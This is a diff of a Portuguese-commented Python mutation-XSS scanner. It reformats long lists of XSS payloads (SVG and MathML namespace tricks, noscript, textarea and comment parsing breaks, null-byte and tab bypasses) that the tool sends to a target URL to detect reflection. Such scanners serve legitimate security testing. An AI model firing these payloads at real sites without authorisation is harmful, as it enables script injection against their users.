@@ -18,6 +18,7 @@ Fluxo:
   5. Detecta contextos de namespace (SVG/MathML)
   6. Retorna resultado consolidado com severidade
 """
+
 import argparse
 import html
 import logging
@@ -113,6 +114,7 @@ _CATEGORY_MAP_DEFAULT: dict[str, list[str]] = {
 
 def _load_category_map() -> dict[str, list[str]]:
     from mytools.data import load_payloads
+
     data = load_payloads("web", "mxss", default={"category_map": _CATEGORY_MAP_DEFAULT})
     return data.get("category_map", _CATEGORY_MAP_DEFAULT)
 
@@ -173,6 +175,7 @@ _ENTITY_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
 
 def _load_entity_payloads() -> list[tuple[str, str, str, list[str]]]:
     from mytools.data import load_payloads
+
     data = load_payloads("web", "mxss", default={"entity_payloads": [list(t) for t in _ENTITY_PAYLOADS_DEFAULT]})
     return [tuple(x) for x in data.get("entity_payloads", [list(t) for t in _ENTITY_PAYLOADS_DEFAULT])]
 
@@ -182,37 +185,37 @@ _ENTITY_PAYLOADS = _load_entity_payloads()
 _NAMESPACE_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
     (
         "svg_script_direct",
-        '<svg><script>alert(1)</script></svg>',
+        "<svg><script>alert(1)</script></svg>",
         "svg_script",
         ["svg", "script"],
     ),
     (
         "svg_foreignobject",
-        '<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>',
+        "<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>",
         "svg_foreignobject",
         ["svg", "foreignObject", "onerror"],
     ),
     (
         "svg_desc_script",
-        '<svg><desc><script>alert(1)</script></desc></svg>',
+        "<svg><desc><script>alert(1)</script></desc></svg>",
         "svg_desc",
         ["svg", "desc", "script"],
     ),
     (
         "svg_title_script",
-        '<svg><title><script>alert(1)</script></title></svg>',
+        "<svg><title><script>alert(1)</script></title></svg>",
         "svg_title",
         ["svg", "title", "script"],
     ),
     (
         "svg_animate_onbegin",
-        '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
+        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
         "svg_animate",
         ["svg", "animate", "onbegin"],
     ),
     (
         "svg_set_onload",
-        '<svg><set attributeName=onload to=alert(1)>',
+        "<svg><set attributeName=onload to=alert(1)>",
         "svg_set",
         ["svg", "set", "onload"],
     ),
@@ -224,7 +227,7 @@ _NAMESPACE_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
     ),
     (
         "svg_foreign_nested",
-        '<svg><foreignObject><div><style><img src=x onerror=alert(1)></style></div></foreignObject></svg>',
+        "<svg><foreignObject><div><style><img src=x onerror=alert(1)></style></div></foreignObject></svg>",
         "svg_foreign_nested",
         ["svg", "foreignObject", "style", "onerror"],
     ),
@@ -233,6 +236,7 @@ _NAMESPACE_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
 
 def _load_namespace_payloads() -> list[tuple[str, str, str, list[str]]]:
     from mytools.data import load_payloads
+
     data = load_payloads("web", "mxss", default={"namespace_payloads": [list(t) for t in _NAMESPACE_PAYLOADS_DEFAULT]})
     return [tuple(x) for x in data.get("namespace_payloads", [list(t) for t in _NAMESPACE_PAYLOADS_DEFAULT])]
 
@@ -242,7 +246,7 @@ _NAMESPACE_PAYLOADS = _load_namespace_payloads()
 _MATHML_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
     (
         "mathml_mtext_html",
-        '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
+        "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
         "mathml_mtext",
         ["math", "mtext", "mglyph", "onerror"],
     ),
@@ -260,31 +264,31 @@ _MATHML_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
     ),
     (
         "mathml_mi_html",
-        '<math><mi><img src=x onerror=alert(1)></mi></math>',
+        "<math><mi><img src=x onerror=alert(1)></mi></math>",
         "mathml_mi",
         ["math", "mi", "onerror"],
     ),
     (
         "mathml_mo_html",
-        '<math><mo><img src=x onerror=alert(1)></mo></math>',
+        "<math><mo><img src=x onerror=alert(1)></mo></math>",
         "mathml_mo",
         ["math", "mo", "onerror"],
     ),
     (
         "mathml_mn_html",
-        '<math><mn><img src=x onerror=alert(1)></mn></math>',
+        "<math><mn><img src=x onerror=alert(1)></mn></math>",
         "mathml_mn",
         ["math", "mn", "onerror"],
     ),
     (
         "mathml_ms_html",
-        '<math><ms><img src=x onerror=alert(1)></ms></math>',
+        "<math><ms><img src=x onerror=alert(1)></ms></math>",
         "mathml_ms",
         ["math", "ms", "onerror"],
     ),
     (
         "mathml_form_escape",
-        '<math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>',
+        "<math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>",
         "mathml_form",
         ["math", "mtext", "form", "onerror"],
     ),
@@ -293,6 +297,7 @@ _MATHML_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
 
 def _load_mathml_payloads() -> list[tuple[str, str, str, list[str]]]:
     from mytools.data import load_payloads
+
     data = load_payloads("web", "mxss", default={"mathml_payloads": [list(t) for t in _MATHML_PAYLOADS_DEFAULT]})
     return [tuple(x) for x in data.get("mathml_payloads", [list(t) for t in _MATHML_PAYLOADS_DEFAULT])]
 
@@ -302,55 +307,55 @@ _MATHML_PAYLOADS = _load_mathml_payloads()
 _RAWTEXT_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
     (
         "noscript_double",
-        '<noscript><style></noscript><img src=x onerror=alert(1)>',
+        "<noscript><style></noscript><img src=x onerror=alert(1)>",
         "noscript_rawtext",
         ["noscript", "style", "onerror"],
     ),
     (
         "noscript_noscript",
-        '<noscript><noscript><img src=x onerror=alert(1)></noscript></noscript>',
+        "<noscript><noscript><img src=x onerror=alert(1)></noscript></noscript>",
         "noscript_nested",
         ["noscript", "img", "onerror"],
     ),
     (
         "textarea_double",
-        '<textarea><script>alert(1)</script></textarea>',
+        "<textarea><script>alert(1)</script></textarea>",
         "textarea_rawtext",
         ["textarea", "script"],
     ),
     (
         "textarea_comment_break",
-        '<textarea><!--</textarea><script>alert(1)</script>-->',
+        "<textarea><!--</textarea><script>alert(1)</script>-->",
         "textarea_comment",
         ["textarea", "script"],
     ),
     (
         "title_double",
-        '<title><script>alert(1)</script></title>',
+        "<title><script>alert(1)</script></title>",
         "title_rawtext",
         ["title", "script"],
     ),
     (
         "style_svg_decode",
-        '<svg><style><img src=x onerror=alert(1)></style></svg>',
+        "<svg><style><img src=x onerror=alert(1)></style></svg>",
         "svg_style",
         ["svg", "style", "onerror"],
     ),
     (
         "xmp_element",
-        '<xmp><script>alert(1)</script></xmp>',
+        "<xmp><script>alert(1)</script></xmp>",
         "xmp_rawtext",
         ["xmp", "script"],
     ),
     (
         "listing_element",
-        '<listing><script>alert(1)</script></listing>',
+        "<listing><script>alert(1)</script></listing>",
         "listing_rawtext",
         ["listing", "script"],
     ),
     (
         "iframe_noscript",
-        '<noscript><iframe></noscript><img src=x onerror=alert(1)>',
+        "<noscript><iframe></noscript><img src=x onerror=alert(1)>",
         "noscript_iframe",
         ["noscript", "iframe", "onerror"],
     ),
@@ -359,6 +364,7 @@ _RAWTEXT_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
 
 def _load_rawtext_payloads() -> list[tuple[str, str, str, list[str]]]:
     from mytools.data import load_payloads
+
     data = load_payloads("web", "mxss", default={"rawtext_payloads": [list(t) for t in _RAWTEXT_PAYLOADS_DEFAULT]})
     return [tuple(x) for x in data.get("rawtext_payloads", [list(t) for t in _RAWTEXT_PAYLOADS_DEFAULT])]
 
@@ -368,43 +374,43 @@ _RAWTEXT_PAYLOADS = _load_rawtext_payloads()
 _COMMENT_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
     (
         "comment_empty_break",
-        '<!--><script>alert(1)</script>',
+        "<!--><script>alert(1)</script>",
         "comment_empty",
         ["<!-->", "script"],
     ),
     (
         "comment_dash_break",
-        '<!---><script>alert(1)</script>',
+        "<!---><script>alert(1)</script>",
         "comment_dash",
         ["<!--->", "script"],
     ),
     (
         "comment_in_style",
-        '<style><!--</style><script>alert(1)</script>--></style>',
+        "<style><!--</style><script>alert(1)</script>--></style>",
         "comment_style",
         ["style", "script"],
     ),
     (
         "comment_in_svg",
-        '<svg><style><!--</style><script>alert(1)</script>--></style></svg>',
+        "<svg><style><!--</style><script>alert(1)</script>--></style></svg>",
         "comment_svg",
         ["svg", "style", "script"],
     ),
     (
         "comment_in_mathml",
-        '<math><mtext><style><!--</style><img src=x onerror=alert(1)>',
+        "<math><mtext><style><!--</style><img src=x onerror=alert(1)>",
         "comment_mathml",
         ["math", "mtext", "onerror"],
     ),
     (
         "comment_malformed",
-        '<!--><img src=x onerror=alert(1)>',
+        "<!--><img src=x onerror=alert(1)>",
         "comment_malformed",
         ["<!-->", "onerror"],
     ),
     (
         "comment_in_textarea",
-        '<textarea><!--</textarea><img src=x onerror=alert(1)>',
+        "<textarea><!--</textarea><img src=x onerror=alert(1)>",
         "comment_textarea",
         ["textarea", "onerror"],
     ),
@@ -413,6 +419,7 @@ _COMMENT_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
 
 def _load_comment_payloads() -> list[tuple[str, str, str, list[str]]]:
     from mytools.data import load_payloads
+
     data = load_payloads("web", "mxss", default={"comment_payloads": [list(t) for t in _COMMENT_PAYLOADS_DEFAULT]})
     return [tuple(x) for x in data.get("comment_payloads", [list(t) for t in _COMMENT_PAYLOADS_DEFAULT])]
 
@@ -422,25 +429,25 @@ _COMMENT_PAYLOADS = _load_comment_payloads()
 _TEMPLATE_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
     (
         "template_script",
-        '<template><script>alert(1)</script></template>',
+        "<template><script>alert(1)</script></template>",
         "template_rawtext",
         ["template", "script"],
     ),
     (
         "template_nested",
-        '<template><div><template><script>alert(1)</script></template></div></template>',
+        "<template><div><template><script>alert(1)</script></template></div></template>",
         "template_nested",
         ["template", "script"],
     ),
     (
         "details_ontoggle",
-        '<details open ontoggle=alert(1)>',
+        "<details open ontoggle=alert(1)>",
         "details_event",
         ["details", "ontoggle"],
     ),
     (
         "marquee_onstart",
-        '<marquee onstart=alert(1)>',
+        "<marquee onstart=alert(1)>",
         "marquee_event",
         ["marquee", "onstart"],
     ),
@@ -455,6 +462,7 @@ _TEMPLATE_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
 
 def _load_template_payloads() -> list[tuple[str, str, str, list[str]]]:
     from mytools.data import load_payloads
+
     data = load_payloads("web", "mxss", default={"template_payloads": [list(t) for t in _TEMPLATE_PAYLOADS_DEFAULT]})
     return [tuple(x) for x in data.get("template_payloads", [list(t) for t in _TEMPLATE_PAYLOADS_DEFAULT])]
 
@@ -464,19 +472,19 @@ _TEMPLATE_PAYLOADS = _load_template_payloads()
 _ENCODING_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
     (
         "backtick_attribute",
-        '<img src=`x`onerror=alert(1)>',
+        "<img src=`x`onerror=alert(1)>",
         "backtick_quote",
         ["img", "onerror"],
     ),
     (
         "null_byte_tag",
-        '<img src=x\x00onerror=alert(1)>',
+        "<img src=x\x00onerror=alert(1)>",
         "null_byte",
         ["img", "onerror"],
     ),
     (
         "tab_newline_bypass",
-        '<scr\tipt>alert(1)</scr\tipt>',
+        "<scr\tipt>alert(1)</scr\tipt>",
         "tab_in_tag",
         ["script"],
     ),
@@ -488,13 +496,13 @@ _ENCODING_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
     ),
     (
         "table_flatten",
-        '<table><tr><td><style><img src=x onerror=alert(1)>',
+        "<table><tr><td><style><img src=x onerror=alert(1)>",
         "table_flatten",
         ["table", "style", "onerror"],
     ),
     (
         "a_nested_table",
-        '<a id=1><table><a id=2>',
+        "<a id=1><table><a id=2>",
         "anchor_table",
         ["a", "table"],
     ),
@@ -503,6 +511,7 @@ _ENCODING_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
 
 def _load_encoding_payloads() -> list[tuple[str, str, str, list[str]]]:
     from mytools.data import load_payloads
+
     data = load_payloads("web", "mxss", default={"encoding_payloads": [list(t) for t in _ENCODING_PAYLOADS_DEFAULT]})
     return [tuple(x) for x in data.get("encoding_payloads", [list(t) for t in _ENCODING_PAYLOADS_DEFAULT])]
 
@@ -520,7 +529,8 @@ _ALL_PAYLOADS: dict[str, list[tuple[str, str, str, list[str]]]] = {
 }
 
 _RE_EVENT_HANDLER = re.compile(
-    r"\bon\w+\s*=", re.IGNORECASE,
+    r"\bon\w+\s*=",
+    re.IGNORECASE,
 )
 
 
@@ -639,11 +649,7 @@ async def _test_mxss_category(
             status_changed = t_status != b_status
             size_changed = abs(t_size - b_size) > 50
 
-            vulnerable = (
-                bool(entity_info["decoded_reflected"])
-                or (reflected and bool(entity_info["entities_decoded"]))
-                or (reflected and bool(namespace_ctxs))
-            )
+            vulnerable = bool(entity_info["decoded_reflected"]) or (reflected and bool(entity_info["entities_decoded"])) or (reflected and bool(namespace_ctxs))
 
             details = ""
             if entity_info["decoded_reflected"]:
@@ -653,31 +659,52 @@ async def _test_mxss_category(
             if namespace_ctxs:
                 details += f" (contexts: {', '.join(namespace_ctxs)})"
 
-            results.append(MXSSAttempt(
-            exploit="mutation_xss_payload",
-            tool="XSStrike",
-                technique=technique, category=category, context=context,
-                payload=payload[:200], method="GET",
-                status_baseline=b_status, status_test=t_status,
-                size_baseline=b_size, size_test=t_size,
-                status_changed=status_changed, size_changed=size_changed,
-                entities_decoded=entity_info["entities_decoded"],
-                decoded_reflected=entity_info["decoded_reflected"],
-                namespace_contexts=namespace_ctxs,
-                vulnerable=vulnerable, details=details, error="",
-            ))
+            results.append(
+                MXSSAttempt(
+                    exploit="mutation_xss_payload",
+                    tool="XSStrike",
+                    technique=technique,
+                    category=category,
+                    context=context,
+                    payload=payload[:200],
+                    method="GET",
+                    status_baseline=b_status,
+                    status_test=t_status,
+                    size_baseline=b_size,
+                    size_test=t_size,
+                    status_changed=status_changed,
+                    size_changed=size_changed,
+                    entities_decoded=entity_info["entities_decoded"],
+                    decoded_reflected=entity_info["decoded_reflected"],
+                    namespace_contexts=namespace_ctxs,
+                    vulnerable=vulnerable,
+                    details=details,
+                    error="",
+                )
+            )
 
         except Exception as e:
-            results.append(MXSSAttempt(
-                technique=technique, category=category, context=context,
-                payload=payload[:200], method="GET",
-                status_baseline=b_status, status_test=0,
-                size_baseline=b_size, size_test=0,
-                status_changed=False, size_changed=False,
-                entities_decoded=False, decoded_reflected=False,
-                namespace_contexts=[], vulnerable=False,
-                details="", error=str(e)[:100],
-            ))
+            results.append(
+                MXSSAttempt(
+                    technique=technique,
+                    category=category,
+                    context=context,
+                    payload=payload[:200],
+                    method="GET",
+                    status_baseline=b_status,
+                    status_test=0,
+                    size_baseline=b_size,
+                    size_test=0,
+                    status_changed=False,
+                    size_changed=False,
+                    entities_decoded=False,
+                    decoded_reflected=False,
+                    namespace_contexts=[],
+                    vulnerable=False,
+                    details="",
+                    error=str(e)[:100],
+                )
+            )
 
     return results
 
@@ -764,8 +791,10 @@ async def run_scan(
             issues.append(f"{len(decoded_vulns)} payloads com entidades decodificadas detectados")
 
         result = MXSSResult(
-            target=target, tls=tls,
-            baseline_status=b_status, baseline_size=b_size,
+            target=target,
+            tls=tls,
+            baseline_status=b_status,
+            baseline_size=b_size,
             attempts=all_attempts,
             vulnerable_techniques=vuln_techs,
             blocked_techniques=blocked_techs,
@@ -776,7 +805,8 @@ async def run_scan(
         print_results(result)
         logger.info(
             "Mutation XSS scan concluido: %d testes, %d vulneraveis",
-            len(all_attempts), len(vuln_techs),
+            len(all_attempts),
+            len(vuln_techs),
         )
 
         if output_file:
@@ -817,10 +847,10 @@ def build_parser() -> argparse.ArgumentParser:
     )
     parser.add_argument("url", help="URL alvo para o scan")
     parser.add_argument(
-        "-c", "--category",
+        "-c",
+        "--category",
         default="all",
-        choices=["all", "entity_decode", "namespace_switch", "mathml_inject",
-                 "rawtext_abuse", "comment_parse", "template_deprecated", "encoding_tricks"],
+        choices=["all", "entity_decode", "namespace_switch", "mathml_inject", "rawtext_abuse", "comment_parse", "template_deprecated", "encoding_tricks"],
         help="Categoria de testes (default: todas)",
     )
     add_common_args(parser)
